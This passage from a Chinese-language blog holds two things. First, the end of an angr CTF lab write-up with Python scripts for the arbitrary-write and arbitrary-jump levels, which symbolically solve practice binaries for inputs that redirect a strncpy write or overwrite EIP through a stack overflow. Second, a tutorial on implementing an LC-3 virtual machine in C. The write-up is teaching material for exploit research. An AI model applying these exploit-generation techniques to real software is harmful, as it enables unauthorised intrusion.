class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, check_key ,input_buffer</span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">20</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;0&#x27;</span>, char &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      self.state.memory.store(check_key, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(input_buffer, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0</span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_strncpy</span>(<span class="params">state</span>):</span></span><br><span class="line">    strncpy_dest = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)  <span class="comment">#  获取strncpy() 的参数,strncpy_dest ..</span></span><br><span class="line">    strncpy_src  = state.memory.load(state.regs.esp + <span class="number">8</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line">    strncpy_len  = state.memory.load(state.regs.esp + <span class="number">12</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line">    src_contents = state.memory.load(strncpy_src, strncpy_len)  <span class="comment">#  因为参数中只保存了地址,需要根据这个地址去获取内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(strncpy_dest) <span class="keyword">and</span> state.se.symbolic(src_contents) :  <span class="comment">#  判断dest 和src 的内容是不是符号化对象</span></span><br><span class="line">      <span class="keyword">if</span> state.satisfiable(extra_constraints=(src_contents[ -<span class="number">1</span> : -<span class="number">64</span> ] == <span class="string">&#x27;KZYRKMKE&#x27;</span> ,strncpy_dest == <span class="number">0x4D52584C</span>)):  <span class="comment">#  尝试求解,其中strncpy_dest == 0x4D52584C 的意思是判断dest 是否可控为password 的地址;src_contents[ -1 : -64 ] == &#x27;KZYRKMKE&#x27; 是判断input_buffer 的内容是否可控为&#x27;KZYRKMKE&#x27; ,因为这块内存是倒序,所以需要通过[ -1 : -64 ] 倒转(contentes 的内容是比特,获取8 字节的大小为:8*8 = 64),然后判断该值是否为字符串&#x27;KZYRKMKE&#x27;</span></span><br><span class="line">        state.add_constraints(src_contents[ -<span class="number">1</span> : -<span class="number">64</span> ] == <span class="string">&#x27;KZYRKMKE&#x27;</span>,strncpy_dest == <span class="number">0x4D52584C</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    strncpy_address = <span class="number">0x8048410</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state.addr == strncpy_address:</span><br><span class="line">      <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution0 = solution_state.se.<span class="built_in">eval</span>(solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>])</span><br><span class="line">    solution1 = solution_state.se.<span class="built_in">eval</span>(solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>],cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution0,solution1)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>state.satisfiable(extra_constraints=(条件1,条件2))  -&gt;  合并多个条件计算是否存在满足约束的解(注意两个或多个条件之间是And 合并判断,不是Or )</p>
</blockquote>
<h2 id="17-angr-arbitrary-jump"><a href="#17-angr-arbitrary-jump" class="headerlink" title="17_angr_arbitrary_jump"></a>17_angr_arbitrary_jump</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/WPYsm7nIjMdl1BL.png" alt="main"></p>
<p>这是一个栈溢出；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(</span><br><span class="line">    initial_state,</span><br><span class="line">    save_unconstrained=<span class="literal">True</span>,</span><br><span class="line">    stashes=&#123;</span><br><span class="line">      <span class="string">&#x27;active&#x27;</span> : [initial_state],</span><br><span class="line">      <span class="string">&#x27;unconstrained&#x27;</span> : [],</span><br><span class="line">      <span class="string">&#x27;found&#x27;</span> : [],</span><br><span class="line">      <span class="string">&#x27;not_needed&#x27;</span> : []</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, input_buffer_address</span>):</span></span><br><span class="line">      input_buffer = claripy.BVS(<span class="string">&#x27;input_buffer&#x27;</span>, <span class="number">64</span> * <span class="number">8</span>)  <span class="comment">#  设置一个较大的input_buffer</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> input_buffer.chop(bits=<span class="number">8</span>):</span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;0&#x27;</span>, char &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      self.state.memory.store(input_buffer_address, input_buffer, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution&#x27;</span>] = input_buffer</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="comment">#  对scanf() 做Hook</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (simulation.active <span class="keyword">or</span> simulation.unconstrained) <span class="keyword">and</span> (<span class="keyword">not</span> simulation.found):  <span class="comment">#  </span></span><br><span class="line">    <span class="keyword">for</span> unconstrained_state <span class="keyword">in</span> simulation.unconstrained:</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">should_move</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">return</span> s <span class="keyword">is</span> unconstrained_state</span><br><span class="line">      </span><br><span class="line">      simulation.move(<span class="string">&#x27;unconstrained&#x27;</span>, <span class="string">&#x27;found&#x27;</span>, filter_func=should_move)  <span class="comment">#  保存</span></span><br><span class="line"></span><br><span class="line">    simulation.step()  <span class="comment">#  步进执行</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution_state.add_constraints(solution_state.regs.eip == <span class="number">0x4D525849</span>)  <span class="comment">#  判断EIP 地址是否可控</span></span><br><span class="line"></span><br><span class="line">    solution = solution_state.se.<span class="built_in">eval</span>(solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution&#x27;</span>],cast_to = <span class="built_in">bytes</span>)  <span class="comment">#  生成Payload</span></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br></pre></td></tr></table></figure>



<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>00<del>02讲解的是基础操作；03</del>07讲解的是符号化常见内容；08讲解的是求解内容约束；09<del>08讲解如何注入来替换函数或者增加函数；11</del>14讲解的都是进阶的内容；15~17讲解的都和控制有关，与pwn题相关；</p>
<p>真正吃透angr会花更多的时间，但真正强化二进制能力的并不是如何去使用angr，而是明白angr函数针对于汇编层的操作；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/03/31/Angr-Lab/" data-id="cl1eht74r0000xwvc6yoza7lk" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-VM实验复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/02/24/VM%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-02-24T14:58:23.000Z" itemprop="datePublished">2022-02-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/02/24/VM%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/">VM实验¤复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>详细实验地址：<a target="_blank" rel="noopener" href="https://justinmeiners.github.io/lc3-vm/index.html#1:12">https://justinmeiners.github.io/lc3-vm/index.html#1:12</a></p>
<p>本质上是在用C语言描述16位机器的操作过程，因此可以以此为一个架接运行一个16位程序，因此成为虚拟机（Virtual Machine）；</p>
<p>前置要求：C语言（写出虚拟机的语言），位运算，汇编代码的运行模式（虚拟机的工作方式，不懂汇编代码的意思也没关系），丁点API知识（键盘传输和屏幕显示，以及内存收取等），LC-3指令集（模拟指令OP）；</p>
<p>指令集地址：<a target="_blank" rel="noopener" href="https://justinmeiners.github.io/lc3-vm/supplies/lc3-isa.pdf">https://justinmeiners.github.io/lc3-vm/supplies/lc3-isa.pdf</a></p>
<p>思路：</p>
<h2 id="1-读取文件"><a href="#1-读取文件" class="headerlink" title="1.    读取文件"></a>1.    读取文件</h2><p>既然要读取其他程序和文件，那需要构造一个内存池容纳16位的程序，总大小也就是二的十六次方；</p>
<p><strong>代码1-1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 65536 locations */</span></span><br><span class="line"><span class="keyword">uint16_t</span> memory[UINT16_MAX];	<span class="comment">//Memory Storage</span></span><br></pre></td></tr></table></figure>

<p>文件读入主要<strong>代码1-2</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* show usage string */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [image-file1] ...\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; argc; ++j)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!read_image(argv[j]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to load image: %s\n&quot;</span>, argv[j]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补充说明：argc 和 argv 是 main 函数参数，第一个代表main参数个数，第二个代表为地址的参数；</p>
<p>作用：如果没有输入main函数的参数，第一个判断就会提示用法为： ./main [image-file1] ；如果输入[image-file1]这个参数，那么就会将其读入for循环中，用 read_image() 函数计算参数并判断，若返回值是0，就会说：装载映像失败；</p>
<p>这里显示出一个函数叫 read_image() ，下面说说它的作用：</p>
<p><strong>代码1-3</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_image_file</span><span class="params">(FILE* file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* the origin tells us where in memory to place the image */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> origin;</span><br><span class="line">    fread(&amp;origin, <span class="keyword">sizeof</span>(origin), <span class="number">1</span>, file);</span><br><span class="line">    origin = swap16(origin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we know the maximum file size so we only need one fread */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> max_read = UINT16_MAX - origin;</span><br><span class="line">    <span class="keyword">uint16_t</span>* p = memory + origin;</span><br><span class="line">    <span class="keyword">size_t</span> read = fread(p, <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>), max_read, file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* swap to little endian */</span></span><br><span class="line">    <span class="keyword">while</span> (read-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = swap16(*p);</span><br><span class="line">        ++p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_image</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* image_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* file = fopen(image_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;;</span><br><span class="line">    read_image_file(file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码中有两个函数，最后一个就是<strong>1-2</strong>中提到的，他的作用就是判断输入的参数地址是否为正确文件地址；如果不是就返回1，进而让<strong>1-2</strong>的判断输出错误并中断程序；如果是就执行 read_image_file() 函数；</p>
<p>read_image_file() 函数的作用便是将读取的程序内存装入之前设定好的memory数组中；首先计算的起始地址：origin，使用fread() C原装函数，读取起始地址；之后计算最大可容纳地址，并用p指针标记，最后使用循环不断缩小范围；</p>
<p>至于为什么要使用swap16()函数呢？因为LC-3程序是大端序排列，一般电脑用的都是小端序，所以要交换高低8位；</p>
<p><strong>代码1-4</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">swap16</span><span class="params">(<span class="keyword">uint16_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">8</span>) | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-内存访问"><a href="#2-内存访问" class="headerlink" title="2.    内存访问"></a>2.    内存访问</h2><p>某些特殊寄存器无法从普通寄存器表中访问。相反，在内存中为它们保留一个特殊地址。要读取和写入这些寄存器，只需读取和写入它们的内存位置即可。这些称为<strong>内存映射寄存器</strong>。它们通常用于与特殊硬件设备进行交互（如键盘）；</p>
<p>LC-3 具有两个需要实现的内存映射寄存器。它们是键盘状态寄存器 （） 和键盘数据寄存器 （）。指示是否已按下某个键，并标识按下了哪个键；</p>
<p><strong>代码2-1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>	//<span class="title">Memory</span> <span class="title">Mapped</span> <span class="title">Registers</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MR_KBSR = <span class="number">0xFE00</span>, <span class="comment">/* keyboard status */</span></span><br><span class="line">    MR_KBDR = <span class="number">0xFE02</span>  <span class="comment">/* keyboard data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面是模拟LC-3 的两个内存寄存器；第一个为状态管理，第二个是数据管理；</p>
<p><strong>代码2-2</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">check_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WaitForSingleObject(hStdin, <span class="number">1000</span>) == WAIT_OBJECT_0 &amp;&amp; _kbhit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_write</span><span class="params">(<span class="keyword">uint16_t</span> address, <span class="keyword">uint16_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">mem_read</span><span class="params">(<span class="keyword">uint16_t</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key())</span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里给出三个函数；第一个是设置windows终端输入的代码（调用API）；第二个是写入内存的代码；第三个是读入内存的代码；</p>
<h2 id="3-模拟寄存器"><a href="#3-模拟寄存器" class="headerlink" title="3.    模拟寄存器"></a>3.    模拟寄存器</h2><p>既然要模拟汇编代码的运行模式，那就少不掉寄存器；在汇编代码中，寄存器就相当于C的变量，保存数据用；</p>
<p>LC-3中，一共只有10个寄存器，8个通用，1个指向即将执行的代码的寄存器(PC)，1个条件控制寄存器；</p>
<p><strong>代码3-1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>	//<span class="title">Registers</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    R_R0 = <span class="number">0</span>,</span><br><span class="line">    R_R1,</span><br><span class="line">    R_R2,</span><br><span class="line">    R_R3,</span><br><span class="line">    R_R4,</span><br><span class="line">    R_R5,</span><br><span class="line">    R_R6,</span><br><span class="line">    R_R7,</span><br><span class="line">    R_PC, <span class="comment">/* program counter */</span></span><br><span class="line">    R_COND,</span><br><span class="line">    R_COUNT</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里多设置了一个，R_COUNT不是寄存器，只是计数用的，因为是从0开始数的；</p>
<p>之后用这个来控制寄存器：</p>
<p><strong>代码3-2</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> reg[R_COUNT];	<span class="comment">//Register Storage</span></span><br></pre></td></tr></table></figure>

<p>而控制寄存器需要特别加一个枚举：</p>
<p><strong>代码3-3</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>	//<span class="title">condition</span> <span class="title">flags</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FL_POS = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, <span class="comment">/* P */</span></span><br><span class="line">    FL_ZRO = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">/* Z */</span></span><br><span class="line">    FL_NEG = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">/* N */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结果为正数则是P，为0则是Z，为负数则是N；它们的计算结果分别是：1，2，4；用到它们的时候，这些数字就代表它们的意义；而实际上是用移位来模拟这些条件位在寄存器中的形式；</p>
<h2 id="4-模拟指令"><a href="#4-模拟指令" class="headerlink" title="4.    模拟指令"></a>4.    模拟指令</h2><p>这里就是LC-3需要用到的指令，于是模拟出所有会用到的：</p>
<p><strong>代码4-1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    OP_BR = <span class="number">0</span>, <span class="comment">/* branch */</span></span><br><span class="line">    OP_ADD,    <span class="comment">/* add  */</span></span><br><span class="line">    OP_LD,     <span class="comment">/* load */</span></span><br><span class="line">    OP_ST,     <span class="comment">/* store */</span></span><br><span class="line">    OP_JSR,    <span class="comment">/* jump register */</span></span><br><span class="line">    OP_AND,    <span class="comment">/* bitwise and */</span></span><br><span class="line">    OP_LDR,    <span class="comment">/* load register */</span></span><br><span class="line">    OP_STR,    <span class="comment">/* store register */</span></span><br><span class="line">    OP_RTI,    <span class="comment">/* unused */</span></span><br><span class="line">    OP_NOT,    <span class="comment">/* bitwise not */</span></span><br><span class="line">    OP_LDI,    <span class="comment">/* load indirect */</span></span><br><span class="line">    OP_STI,    <span class="comment">/* store indirect */</span></span><br><span class="line">    OP_JMP,    <span class="comment">/* jump */</span></span><br><span class="line">    OP_RES,    <span class="comment">/* reserved (unused) */</span></span><br><span class="line">    OP_LEA,    <span class="comment">/* load effective address */</span></span><br><span class="line">    OP_TRAP    <span class="comment">/* execute trap */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>它们实现机器所需要的运算；</p>
<p>而LC-3的运算中，因为是16位，所以这些指令会放在最高的4位判断，剩下的位数就会放参数一类的东西，每个运算的参数需求位都不同，详细请看LC-3指令集；指令集中会要求使用的参数需要扩展为16位运算；所以需要接下来的函数：</p>
<p><strong>代码4-2</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">sign_extend</span><span class="params">(<span class="keyword">uint16_t</span> x, <span class="keyword">int</span> bit_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((x &gt;&gt; (bit_count - <span class="number">1</span>)) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        x |= (<span class="number">0xFFFF</span> &lt;&lt; bit_count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_flags</span><span class="params">(<span class="keyword">uint16_t</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg[r] == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_ZRO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reg[r] &gt;&gt; <span class="number">15</span>) <span class="comment">/* a 1 in the left-most bit indicates negative */</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_NEG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_POS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个函数的作用便是 带符号扩展 位数；第二个函数的作用便是每次运算结束后，调整条件控制寄存器中的三个值；</p>
